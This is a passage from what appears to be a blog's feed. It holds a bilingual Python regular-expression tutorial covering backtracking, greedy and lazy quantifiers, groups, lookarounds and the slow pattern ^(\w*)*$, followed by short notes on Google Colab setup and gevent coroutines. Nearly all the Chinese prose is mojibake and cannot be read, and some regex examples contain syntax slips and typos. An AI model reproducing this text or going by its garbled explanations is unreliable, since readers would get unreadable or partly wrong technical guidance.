<code>^</code> éœ€è¦æ˜¯<code>[]</code> ä¸­å¼€å¤´ç¬¬ä¸€ä¸ªå­—ç¬¦,å¦åˆ™å®ƒå°±å˜æˆäº†å­—é¢æ„æ€çš„ <code>^</code>ã€‚</p></li></ol><h3 id="conditional-expression">Conditional Expression</h3><p>Learn about branching in regular expressions.</p><p>if ... then ... elseï¼š n -&gt; group number name -&gt; group name</p><p><code>(?(n)yes_expression | no_expression)</code><code>(?(name)yes_expression | no_expression)</code></p><p>å¦‚æœ group n æˆ–è€… group name çš„æ¡ä»¶æ»¡è¶³äº†ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œ yes_expression,å¦åˆ™æ‰§è¡Œ no_expression</p><p>è¿™ä¸ªå°±åƒ (A|B) çš„å‡çº§ç‰ˆï¼Œ (A|B) æ˜¯æˆ–è€… A æˆ–è€… Bï¼Œè€Œå®ƒåŠ ä¸€ä¸ª<code>?(n)</code>ï¼Œå¯¹å‰é¢çš„åˆ†ç»„è¿›è¡Œåˆ¤æ–­ï¼Œå°±æˆä¸ºäº†((?(n))A|B)ã€‚</p><h4 id="example">Example</h4><p>if starting character is digit, text need to 3 digits else text neadsto be 4 letters</p><p>Pattern 1: <code>\b(\d)?(?(1)\d&#123;2&#125;|[a-z]&#123;4&#125;)\b</code> å¦‚æœ ?(1) group1ï¼Œå³ï¼š æ»¡è¶³äº†ï¼Œé‚£ä¹ˆæ‰§è¡Œ åŒ¹é…ï¼Œå¦åˆ™æ‰§è¡Œ[a-z]{4}ï¼Œç„¶åä¸¤è¾¹éƒ½æœ‰ wordboundary.</p><p>Pattern 2ï¼š<code>\b(?P&lt;test&gt;\d)(?&lt;test&gt;\d&#123;2&#125;|[a-z]&#123;4&#125;)\b</code></p><p>or simply: <code>\b(\d&#123;3&#125;|[a-z]&#123;4&#125;)\b</code> åŒ¹é… 3 ä¸ªæ•°å­—æˆ–è€… 4ä¸ªå­—ç¬¦ã€‚</p><h2 id="regular-expression-engine---five-key-point">Regular ExpressionEngine - Five Key Point</h2><h3 id="regular-expression-engine-introduction">Regular ExpressionEngine Introduction</h3><p>Python, Perl, .Net Regular Expression Engineså±äºä¸ç¡®å®šæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼ˆNondeterministic FiniteAutomationï¼‰çš„ä¸€ç±»å®ç°ã€‚</p><p>Pattern é©±åŠ¨ç€æ­£åˆ™å¼•æ“å¤„ç†è¾“å…¥æ–‡æœ¬ï¼Œå¹¶é€‰æ‹©æ°å½“çš„è·¯å¾„ã€‚</p><p>ç‰¢è®°ä¹‹å‰çš„æˆåŠŸçŠ¶æ€ï¼Œä»¥é˜²é‡åˆ°ä¸å®Œæ•´åŒ¹é…æ—¶ï¼Œå¯ä»¥é€€å›ä¹‹å‰æˆåŠŸåŒ¹é…çš„çŠ¶æ€ï¼Œå°è¯•å…¶ä»–è·¯å¾„ï¼ˆè¿™é‡Œå’Œè‡ªå·±ç”¨c æŒ‡é’ˆå†™å­—ç¬¦ä¸²åŒ¹é…ç±»ä¼¼ï¼‰ Regexå¼•æ“æœ¬è´¨ä¸Šæ˜¯é€šç”¨çš„ï¼Œå¹¶æŒ‰ç…§æ¨¡å¼ä¸­çš„æŒ‡ç¤ºé‡‡å–è·¯å¾„ã€‚å®ƒä¾èµ–äºå¼€å‘è€…å®šä¹‰æœ‰æ•ˆçš„pattern æ¥æŒ‡å¯¼å¼•æ“ã€‚</p><h3 id="five-key-points">Five key Points</h3><h4 id="one-character-at-a-time">One Character at a time</h4><p>It compares and matches one character at aa time.</p><h4 id="left-to-right">Left to Right</h4><p>Pattern is traversed left to right. Text also is traversed left toright</p><ul><li>Pattern defined left most is attempted first and gradually movesright to attempt</li><li>All viable Patterns are evaluated before proceeding with nextcharacter in the text.</li></ul><h5 id="example-1">Example</h5><p>Left to Right Problem: Find all words that contain car or carpetPattern: <code>car | carpet</code> Text: carpet and car</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200630174032.png"alt="left2right_one_char_per_time" /><figcaption aria-hidden="true">left2right_one_char_per_time</figcaption></figure><p>Regular Expression Engine will try to match <code>car</code> firstlyone character per time to see it's fully match or not, if can't match,it will backtrack to 'c', and try to match the second choice,'carpet'</p><p>è¿™ç§å†™æ³•çš„ç»“æœå°±æ˜¯ï¼šåªåŒ¹é…åˆ°äº† <code>car</code> è€ŒåŒ¹é…ä¸åˆ°<code>carpet</code></p><h5 id="pattern-adjust">Pattern Adjust</h5><ol type="1"><li><p>ä¸‹é¢æˆ‘ä»¬æ¥ä¿®æ­£ä¸€ä¸‹ï¼Œä½¿å…¶å¯ä»¥æ­£ç¡®åŒ¹é…ï¼š</p><p>Pattern: <code>\b(car|carpet)\b</code></p><p>åŒ¹é…è¿‡ç¨‹ï¼š <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200630174421.png"alt="revision" /></p><p>å½“æ­£åˆ™å¼•æ“åœ¨æ–‡æœ¬ä¸­é‡åˆ° <code>carpet</code>æ—¶ï¼Œ å…ˆåŒ¹é…<code>car</code>ï¼Œé€ä¸ªå­—ç¬¦åŒ¹é…ï¼Œ<code>c a r</code>ç„¶åè¯¥åŒ¹é…è¾¹ç•Œäº†ï¼Œå‘ç°ä¸º <code>p</code>ä¸æ˜¯è¾¹ç•Œï¼Œç„¶åæ­£åˆ™å¼•æ“æ²¿åŸè·¯å¾„å›æº¯ï¼Œå‡†å¤‡åŒ¹é… <code>carpet</code>è·¯å¾„ï¼Œé€ä¸ªå­—ç¬¦åŒ¹é…å‘ç°å¯ä»¥ï¼Œå°±åŒ¹é…æˆåŠŸã€‚</p><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ ¹æ® Regexp Engine éµå¾ªçš„ Left to Right æ–¹å¼ï¼Œè¿™ç§Pattern åœ¨é‡åˆ° <code>carpet</code>çš„æ—¶å€™ï¼Œä»ç„¶éœ€è¦å›æº¯ï¼Œè¿™æ ·å¤§å¤§é™ä½äº†æ•ˆç‡ã€‚</p></li><li><p>ä¸ºåŠ æ·±å¯¹æ­£åˆ™å¼•æ“äº†è§£ï¼Œæˆ‘ä»¬å†çœ‹ä¸€ä¸‹</p><p>Patternï¼š <code>\bcar|carpet\b</code> è¿™ä¸ª Patternå’Œä¿®æ­£çš„åªæœ‰ä¸€å¯¹æ‹¬å·çš„åŒºåˆ«ï¼Œå´æ˜¯æ­£ä¸é”™çš„å·®è·ã€‚ å› ä¸º <code>|</code>ä¼šå°†æ•´ä¸ªæ¨¡å¼åˆ†æˆä¸¤åŠï¼Œæ‰€ä»¥è¿™ä¸ª Pattern åŸºæœ¬ç­‰åŒäºï¼š<code>(\bcar)|(carpet\b)</code> çš„ä½œç”¨ã€‚</p></li></ol><h4 id="pattern-adjust-again">Pattern Adjust Again</h4><p>Pattern; <code>\bcar(pet)?\b</code></p><h4 id="summary">Summary</h4><p>Pattern and Text are evaluated Left to Right</p><p>In-order to minimize backtracking, extract common patterns out<code>car(pet)?</code> Write more precise patterns first followed bymore generic patterns</p><h3 id="greedylazy-and-backtracking">Greedyï¼Œlazy and Backtracking</h3><p>Greedy -Consume as much of the input text as possible and thengive-up the characters to match rest of the pattern.</p><ul><li>é‡è¯ <code>*, +, ?</code> æ˜¯è´ªå©ªçš„ï¼ˆgreedyï¼‰ï¼Œå®ƒä»¬ä¼šå°è¯•åŒ¹é…å°½å¯èƒ½å¤šçš„è¾“å…¥æ–‡æœ¬ã€‚(å…¶ä¸­ <code>?</code>è´ªå©ªå’Œæ‡’æƒ°åŒºåˆ«ä¸å¤§)</li><li>æœ‰æ—¶å€™ï¼Œå½“è¿™äº›é‡è¯åº”ç”¨åœ¨åƒ <code>.</code>è¿™æ ·çš„é€šé…ç¬¦ä¸Šæ—¶ï¼Œä¼šæ¶ˆè€—æ‰ä½ å…¨éƒ¨çš„æ–‡æœ¬ï¼Œä»è€Œå¯¼è‡´é¥¿æ­» Patternä¸­çš„åç»­éƒ¨åˆ†ã€‚</li><li>é€šè¿‡åœ¨ <code>*, +, ?</code>ç­‰åé¢å†åŠ ä¸€ä¸ªé—®å·ï¼Œå³ï¼š<code>*?, +?, ??</code>ï¼Œä½¿å…¶å˜ä¸ºæ‡’æƒ°æ¨¡å¼ã€‚</li><li>Regexp Engine è¯„ä¼°è®¡ç®—ï¼Œ æ¯æ¬¡å›æº¯ä¸€æ­¥ï¼Œæ¥çœ‹å®ƒæ˜¯å¦èƒ½æ»¡è¶³ Patternä¸­çš„åç»­éƒ¨åˆ†ã€‚</li></ul><h4 id="example-2">Example</h4><p>Problemï¼šFind sentences ending with a number and extract the number.Pattern: <code>.+(\d+)[.!]</code> textï¼š First 1234. Second 5678ï¼</p><p>Regexp Engine åŒ¹é…æ­¥éª¤ï¼š é¦–å…ˆï¼Œ <code>.</code> æ˜¯è´ªå©ªçš„ï¼Œ ä¼šåŒ¹é…<code>First 1234. Second 5678ï¼</code> , ç„¶åå‘ç°åé¢çš„éƒ¨åˆ†:<code>(\d+)[.!]</code> è¢«é¥¿æ­»äº†ã€‚ç»§è€Œå‘å‰å›æº¯ä¸€ä¸ªå­—ç¬¦ï¼Œ<code>First 1234. Second 5678</code> , ç„¶å <code>(\d+)</code>è¿˜æ˜¯è¢«é¥¿æ­»äº†ï¼Œ å†å‘å‰å›æº¯ä¸€ä¸ªå­—ç¬¦ <code>First 1234. Second 567</code> ,äºæ˜¯åŒ¹é…æˆåŠŸã€‚ <code>.+</code> åŒ¹é…ï¼š<code>First 1234. Second 567</code> , <code>(\d+)</code> åŒ¹é…äº† 8ï¼Œ<code>[.!]</code> åŒ¹é…äº† <code>ï¼</code></p><h4 id="lazy">Lazy</h4><p>Lazy â€” Consumes as few input text as possible and then attempts tomatch rest of the patterns</p><p>é‡è¯ <code>*, +, ?</code> æ˜¯è´ªå©ªçš„</p><ul><li>Quantifiers <code>*,+,?</code> can be turned to Lazy by adding a<code>?</code> After the quantifier</li></ul><p>Example: <code>*?, +?, ??</code></p><ul><li>Idea behind lazy is' to match as few times as possible forquantifiers and proceed to match rest of the pattern</li><li>When there is no match for a pattern, lazy mode backtracks on thepattern and <strong>expands to match more characters ininput.</strong></li></ul><h4 id="example-3">Example</h4><p>Pattern: <code>.+?(\d+)[.!]</code> textï¼š First 1234. Second5678ï¼</p><p>é€šè¿‡ <code>?</code> ä½¿å¾— <code>+</code> å˜æˆ lazy æ¨¡å¼ã€‚lazy ä½¿å¾—<code>.</code> å…ˆåŒ¹é…å°½å¯èƒ½å°‘çš„ï¼Œ äºæ˜¯åŒ¹é…äº† F, ç„¶åè¿›è¡ŒåŒ¹é…ï¼Œå‘ç°æ²¡æœ‰æ•°å­—å¯ä»¥åŒ¹é…äº†ï¼Œ é‚£å°± Pattern å‘å‰å›æº¯ä¸€æ­¥ï¼Œ æ¥ç€é€šè¿‡<code>.</code> åŒ¹é…ï¼Œ äºæ˜¯åŒ¹é… <code>Fi</code> , ç„¶åå†æ¬¡è¿›è¡ŒåŒ¹é…ï¼Œå‘ç°ä»ç„¶ä¸è¡Œï¼Œè¿›è€Œ Pattern å†æ¬¡å›æº¯ï¼Œ Pattern å¦‚æ­¤åå¤å›æº¯ï¼Œ æœ€ç»ˆ<code>.</code> åŒ¹é…äº† <code>First</code> , <code>\d</code> åŒ¹é…äº†<code>1234</code> ï¼Œ æ ‡ç‚¹ç¬¦å·åŒ¹é…äº† <code>.</code></p><h3 id="groups">Groups</h3><h4 id="indexed-named-non-capturing">Indexedï¼Œ Namedï¼Œ NonCapturing</h4><p>ç”¨å¤„ä¸€ï¼š</p><p>Break a pattern into sub-patterns; pinpoint location of matchingstring and sub-strings Groups are any pattern specified inside aparenthesis <code>()</code> Reuse common patterns, Mark as optional â€”minimize backtracking <code>car(pet)?</code></p><p>Extract Values:<code>(?P&lt;year&gt;\d&#123;4&#125;)(?P&lt;month&gt;\d&#123;2&#125;)(?P&lt;day&gt;\d&#123;2&#125;)</code></p><p>ç”¨å¤„äºŒï¼š Capture Repeating Sub-Patterns<code>\d+(, \d&#123;3&#125;)*(\.\d&#123;2&#125;)?</code></p><p>Matchesï¼š 123.67 123, 456.75 127, 546, 245.58</p><h5 id="indexed-group">Indexed Group</h5><ul><li><p>Capture matching substring</p><p>â€¢ Problem: Extract year, month and day from string yyyymmdd â€¢Pattern: ()()() â€¢ Text: 20160501</p></li><li><p>Access by group number</p><p>Groups are numbered from left-to-right. Every open parenthesis isassigned anincreasing number starting from 1 Group 0 =&gt; Refers towhole pattern Group 1 =&gt; () Group 2 =&gt; () Group 3 =&gt; () pythonä¸­ group() æ–¹æ³•é»˜è®¤è¿”å› whole pattern</p></li></ul><h4 id="named-group">Named Group</h4><p>åœ¨å·¦æ‹¬å·ååŠ <code>?P&lt;group_name&gt;</code>,ä¾‹å¦‚ï¼š<code>(ï¼ŸP&lt;name&gt;\d+?)</code></p><h5 id="non-capturing-groups">Non-Capturing Groups</h5><p>æœ‰æ—¶å€™æˆ‘ä»¬ä½¿ç”¨ group åªæ˜¯ä¸ºäº†åŒ¹é…ï¼Œè€Œå¹¶ä¸æƒ³æ•è· group çš„å€¼ã€‚ä¾‹å¦‚ï¼šGroups are used here to capture repeating patternsï¼Œ æ¯”å¦‚ä¸Šé¢ pattern çš„<code>(,\d&#123;3&#125;)*(\.\d&#123;2&#125;)?</code>ä¸¤ä¸ªåˆ†ç»„ï¼Œæˆ‘ä»¬å¹¶ä¸å…³æ³¨åˆ†ç»„è‡ªå·±çš„å†…å®¹ï¼Œæˆ‘ä»¬ä½¿ç”¨åˆ†ç»„æ˜¯ä¸ºäº†æ›´å¥½åœ°åŒ¹é…æ•´ä½“ã€‚Groupcapture is expensive, turn it off when not needed</p><ul><li><p>Match without group capture</p><p>Problem: Match number of format 999,999,999.99 Capturing GroupsVersion Pattern: <code>\d+(,\d&#123;3&#125;)*(\.\d&#123;2&#125;)?</code> Text:20,198,425.12</p></li></ul><p>æ–¹æ³•ï¼šåœ¨åˆ†ç»„ ( ) å†…çš„å¼€å¤´å¢åŠ  <code>?:</code></p><p>Non-Capturing Group (?:) Pattern:<code>\d+(?:,\d&#123;3&#125;)*(?:\.\d&#123;2&#125;)?</code></p><h4 id="group---back-reference-and-substitution">Group - Back referenceand Substitution</h4><ul><li>Back reference refers to a group that was captured earlier and usedsubsequently in</li></ul><p>â€¢ Problem: Identify repeating words â€¢ Pattern:<code>(?P&lt;word&gt;\w+)\s+(?P=word)\b</code> â€¢ Text: capture duplicateduplicate words</p><p>â€¢ Problem: Identify repeating letters â€¢ Pattern:<code>(?P&lt;1etter&gt;\w)(?P=1etter)</code></p><ul><li>Substitution pattern used for text replacement can refer topreviously captured group</li></ul><ol type="1"><li><p><code>\g</code></p><p>â€¢ Problem: Identify repeating words and remove repetition â€¢ FindPattern: <code>(?P&lt;word&gt;\w+)\s+(?P=word)\b</code> â€¢ ReplacementPattern: <code>\g&lt;word&gt;</code></p></li><li><p>ä½¿ç”¨ <code>\num</code></p><p>æ¯”å¦‚ï¼š <code>\1</code> è¡¨ç¤ºç¬¬ä¸€ä¸ªåˆ†ç»„</p></li></ol><h3 id="lookarounds">Lookarounds</h3><p>Lookbehinds and lookaheads (also called lookarounds) are specifictypes of non-capturing groups (used to match a pattern but withoutincluding it in the matching list)</p><p>Look ahead â€” Peek at what is coming up next without consuming thecharacters Look behind â€” Look at what came before current character Bothare called <strong>zero width assertions</strong> - Returns True orFalse - Does not consume any characters</p><ul><li>Look ahead is similar to "if (expression) yes_expression"</li><li>Look ahead and Look behind can contain patterns Allows you toimplement more complex conditional logic</li><li>Does not backtrack â€” Once it return a true/false, job is done. Ifpattern does not match, Look ahead/Look behind would not backtrack totry another match.</li></ul><p>these two assertion don't consume and match the Look part.</p><table><thead><tr class="header"><th style="text-align: center;">Symbol</th><th>Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><code>?=</code></td><td>Positive Lookaheadï¼ˆå¸Œæœ›æœªå»çš„å‰æ–¹(å³è¾¹)æœ‰ï¼‰</td></tr><tr class="even"><td style="text-align: center;"><code>?!</code></td><td>Negative Lookaheadï¼ˆå¸Œæœ›æœªå»çš„å‰æ–¹(å³è¾¹)æ— ï¼‰</td></tr><tr class="odd"><td style="text-align: center;"><code>?&lt;=</code></td><td>Positive Lookbehindï¼ˆå¸Œæœ›å·²æ¥çš„åæ–¹(å·¦è¾¹)è¾¹æœ‰ï¼‰</td></tr><tr class="even"><td style="text-align: center;"><code>?&lt;!</code></td><td>Negative Lookbehind ï¼ˆå¸Œæœ›å·²æ¥çš„åæ–¹(å·¦è¾¹)è¾¹æ— ï¼‰</td></tr></tbody></table><h2 id="regular-expression-proformance">Regular ExpressionProformance</h2><h3 id="backtracking-exponential-delay-example">Backtracking ExponentialDelay Example</h3><p>Type of patterns that can cause performance issues</p><p>Problem: Match a word Pattern: <code>^(\w*)*$</code> Text (Positive):12345678901234567890 Text (partial match): 12345678901234567890!</p><p>Pattern works perfectly for positive matches. With partial matches,perfomance degrades rapiadly and every addtional character double theresponse time.</p><p>æ­£åˆ™å¼•æ“ï¼š Match 1: 1 Match 2: 12 Match 3: 123 Match 4: 1234 Match 5:12345 - <code>!</code> Does not match stops now. And end of string $match fails. äºæ˜¯ï¼Œ Pattern è¿›è¡Œå›æº¯ï¼ŒåŒ¹é…å‡ºä¸¤ç»„ï¼š(1234ï¼‰ï¼ˆ5ï¼‰,ç„¶åæœ€åè¿˜æ˜¯æœ‰ <code>ï¼</code> ä¸èƒ½æ»¡è¶³ç»“å°¾ã€‚å› æ­¤ï¼Œç»§ç»­å›æº¯ï¼ŒåŒ¹é…å‡ºä¸¤ç»„ï¼š(123ï¼‰ï¼ˆ45ï¼‰, ç„¶åæœ€åè¿˜æ˜¯æœ‰ <code>ï¼</code>ä¸èƒ½æ»¡è¶³ç»“å°¾ã€‚ å°±è¿™æ ·å›æº¯åˆ°å¤´ï¼Œç„¶ååŒ¹é…å¤±è´¥</p><h2 id="issues-and-fix">4.2. Issues and Fix</h2><p>Pattern: <code>(\w*)*</code> =&gt; <code>(\w*)(\w*)(\w*)</code>å¤šä¸ªç›¸ä¼¼çš„è´ªå©ªæ¨¡å¼æ•è·ç›¸åŒçš„å­—ç¬¦(ä¸²)ï¼Œä¼šå¯¼è‡´ä¸¥é‡çš„æ€§èƒ½é—®é¢˜ã€‚</p><p>ä¿®æ”¹æ–¹å¼ï¼š</p><ul><li>Option 1: No need to have a group level quantifier</li></ul><p><code>^(\w*)*$</code> =&gt; <code>^(\w*)$</code></p><ul><li>Option 2: Precise terminating condition. Every word in group shouldend in a word boundary.</li></ul><p><code>^(\w*)*$</code> =&gt; <code>^(\w*\b)*$</code></p><ul><li>Disable group capture</li></ul><p><code>^(\w*)$</code> =&gt; <code>\w*$</code> or<code>^(?:\w*)$</code></p><h2 id="module-versus-compiled-regex-method-invocation">Module VersusCompiled Regex Method Invocation</h2><p>Compiled Regex Objects vs Module Methods You have two ways to invokeregular expression functionality</p><ul><li>Create a compiled object and invoke methods of that object</li><li>Use re module methods directly</li></ul><p>ç¼–è¯‘å¯¹è±¡çš„æ–¹æ³•æä¾›äº†ä¸€äº›å¾®è°ƒå‚æ•°ã€‚ ä¾‹å¦‚ï¼šæœç´¢çš„å¼€å§‹ã€ç»“æŸä½ç½®</p><p>re module caches the compiled version of patterns and reuses them</p><ul><li>Python 3 Pattern Cache Size is 512</li><li>Python 2 Pattern Cache size is 100</li><li>When patterns exceed cache size, current implementation of re simplyclears the entire cache.</li></ul><p>Best Practice: For high performance and/or high frequency invocationof patterns â€” Use compiled objects, hold reference to the objects andreuse them.</p><p>æ€»ä½“æ¥è¯´ï¼š é‡åˆ°ä¸€ä¸ª pattern éœ€è¦é‡å¤åŒ¹é…å¤šæ¬¡ï¼Œæˆ–è€…å¤šä¸ª patternåŒ¹é…çš„æƒ…å†µï¼Œä½¿ç”¨ç¼–è¯‘å¥½çš„ pattern å¯¹è±¡æ›´åŠ å¿«ã€‚ re module åœ¨é‡å¤æ¬¡æ•°å°‘ï¼Œpython3 ä¸‹ pattern ç¼“å­˜ä¸ªæ•°æ¯”è¾ƒå°‘äºç¼“å­˜å€¼ï¼š512 æ—¶ï¼Œæ•ˆæœè¿˜è¡Œã€‚</p><h2 id="match-unicode-characters">Match Unicode Characters</h2><p>vscode å’Œ pyhton3 çš„ re æ¨¡å—é»˜è®¤çš„éƒ½æ˜¯ unicode å­—ç¬¦é›†ï¼Œå› æ­¤åœ¨ Python3çš„ re æ¨¡å—æˆ– vscode ä¸­éƒ½ç›´æ¥ä½¿ç”¨å³å¯ï¼š <code>[\u4e00-\u9fa5]</code></p><p>åŒ¹é…çš„æ˜¯èƒ½ç»„æˆå•è¯çš„å­—ç¬¦ï¼Œåœ¨ python3 ä¸­ re é»˜è®¤æ”¯æŒçš„æ˜¯ unicodeå­—ç¬¦é›†ï¼Œå½“ç„¶ä¹Ÿæ”¯æŒæ±‰å­—ã€‚åªè¦åŠ å…¥ re.A å°±å¯ä»¥è§£å†³è¿™æ ·é—®é¢˜ï¼Œ</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><ahref="https://blog.csdn.net/tinyletero/article/details/8201465">unicodeç¼–ç [e00-fa5]åŒ¹é…æ‰€æœ‰ä¸­æ–‡</a></li><li><ahref="https://blog.csdn.net/suzimuyu99/article/details/80924402">Pythonæ­£åˆ™åŒ¹é…ä¸­æ–‡çš„é—®é¢˜</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Regexp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°å½• colab çš„ä½¿ç”¨</title>
      <link href="/blog/2021/06/15/programming/python/colab/"/>
      <url>/blog/2021/06/15/programming/python/colab/</url>
      
        <content type="html"><![CDATA[<h2 id="colab-è¿æ¥-google-drive">colab è¿æ¥ google drive</h2><p>å‰ä¸¤å¥ mountï¼Œåä¸¤å¥åˆ‡æ¢è·¯å¾„å¹¶æŸ¥çœ‹å½“å‰è·¯å¾„ï¼Œpipç­‰å‘½ä»¤æ‰§è¡Œå‰åŠ <code>!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from google.colab import drive</span><br><span class="line">drive.mount(&#x27;/content/drive&#x27;)</span><br><span class="line">%cd /content/drive/MyDrive/&quot;Colab Notebooks&quot;/&quot;blog-dataset-vs-accuracy&quot;</span><br><span class="line">%pwd</span><br></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹å¯ç”¨-gpucpu-å®¹é‡">æŸ¥çœ‹å¯ç”¨ GPU/CPU å®¹é‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">!ln -sf /opt/bin/nvidia-smi /usr/bin/nvidia-smi</span><br><span class="line">!pip install gputil</span><br><span class="line">!pip install psutil</span><br><span class="line">!pip install humanize</span><br><span class="line">import psutil</span><br><span class="line">import humanize</span><br><span class="line">import os</span><br><span class="line">import GPUtil as GPU</span><br><span class="line">GPUs = GPU.getGPUs()</span><br><span class="line">gpu = GPUs[0]</span><br><span class="line">def printm():</span><br><span class="line"> process = psutil.Process(os.getpid())</span><br><span class="line"> print(&quot;Gen RAM Free: &quot; + humanize.naturalsize( psutil.virtual_memory().available ), &quot; | Proc size: &quot; + humanize.naturalsize( process.memory_info().rss))</span><br><span class="line"> print(&quot;GPU RAM Free: &#123;0:.0f&#125;MB | Used: &#123;1:.0f&#125;MB | Util &#123;2:3.0f&#125;% | Total &#123;3:.0f&#125;MB&quot;.format(gpu.memoryFree, gpu.memoryUsed, gpu.memoryUtil*100, gpu.memoryTotal))</span><br><span class="line">printm()</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ GPU å‹å·ï¼š<code>!/opt/bin/nvidia-smi</code></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python åç¨‹ gevent</title>
      <link href="/blog/2021/06/15/programming/python/gevent/"/>
      <url>/blog/2021/06/15/programming/python/gevent/</url>
      
        <content type="html"><![CDATA[<h1 id="python-åç¨‹-gevent">Python åç¨‹ gevent</h1><p>gevent å°è£…çš„ greenletï¼Œ greenlet å°è£…çš„ yieldï¼ˆ å³ï¼šç”Ÿæˆå™¨ï¼‰ã€‚</p><p>é€šè¿‡ <code>gevent.spawn()</code> åˆ›å»ºä¸€ä¸ª greenlet å¯¹è±¡ï¼Œé€šè¿‡greenlet è¿›è¡Œ switchï¼Œè°ƒç”¨ yieldã€‚</p><p>gevent.spawn(å‡½æ•°ï¼Œå‚æ•°)</p><p>gevent åœ¨é‡åˆ°å»¶æ—¶æ“ä½œï¼ˆgevent.sleep(0)ï¼‰æ—¶ï¼Œå…ˆå»æ‰§è¡Œåˆ«çš„ã€‚</p><p>å¦‚æœä½ æƒ³ç”¨ geventï¼Œ é‚£éœ€è¦æŠŠæ‰€æœ‰çš„å»¶æ—¶æ“ä½œæ¢æˆ gevent.sleep(0)æˆ–è€…é€šè¿‡æ‰“è¡¥ä¸çš„æ–¹å¼è®©ç¨‹åºè‡ªåŠ¨æ›¿æ¢ã€‚</p><p>å¦‚æœä¸€ä¸ªçº¿ç¨‹ç­‰å¾…æŸäº›æ¡ä»¶ï¼Œå¯ä»¥å……åˆ†åˆ©ç”¨è¿™ä¸ªæ—¶é—´å»åšå…¶å®ƒäº‹æƒ…ï¼Œå…¶å®è¿™å°±æ˜¯åç¨‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from gevent import monkey</span><br><span class="line">monkey.patch_all()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">print</span>(gevent.getcurrent(), i)</span><br><span class="line">        time.sleep(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g1.join()</span><br><span class="line"><span class="comment"># ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œä¹‹åï¼Œé˜»å¡å»¶è¿Ÿï¼Œäºæ˜¯å»è¿è¡Œä¸Šé¢çš„å‡½æ•°ï¼Œg1 å¯¹åº”çš„å‡½æ•°ï¼Œç„¶åé‡åˆ° time.sleep(0) patch åçš„ gevent.sleep(0)ï¼Œåˆ‡æ¢åˆ° g2 å¯¹åº”çš„å‡½æ•°ï¼Œå¹¶è¿è¡Œï¼Œç›´åˆ°é‡åˆ° gevent.sleep(0)å†æ¬¡åˆ‡æ¢ã€‚</span></span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure><p><code>join()</code> å µå¡ï¼Œç›´åˆ°è°ƒç”¨ joinçš„å¯¹è±¡çš„å®Œæˆæ“ä½œã€‚<code>joinall()</code> æ¥å—ä¸€ä¸ªåˆ—è¡¨å‚æ•°ã€‚</p><h4 id="ç®€å•æ€»ç»“">ç®€å•æ€»ç»“</h4><ol type="1"><li>è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„å•ä½</li><li>çº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿè°ƒåº¦çš„å•ä½</li><li>è¿›ç¨‹åˆ‡æ¢éœ€è¦çš„èµ„æºå¾ˆæœ€å¤§ï¼Œæ•ˆç‡å¾ˆä½ ï¼ˆä¸€èˆ¬ä¸ç”¨ï¼‰</li><li>çº¿ç¨‹åˆ‡æ¢éœ€è¦çš„èµ„æºä¸€èˆ¬ï¼Œæ•ˆç‡ä¸€èˆ¬ï¼ˆå½“ç„¶äº†åœ¨ä¸è€ƒè™‘ GIL çš„æƒ…å†µä¸‹ï¼‰</li><li>æ¶‰åŠç½‘ç»œå µå¡æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨åç¨‹ï¼Œ å…¶åˆ‡æ¢ä»»åŠ¡èµ„æºå¾ˆå°ï¼Œæ•ˆç‡é«˜</li><li>å¤šè¿›ç¨‹ã€å¤šçº¿ç¨‹æ ¹æ® cpuæ ¸æ•°ä¸ä¸€æ 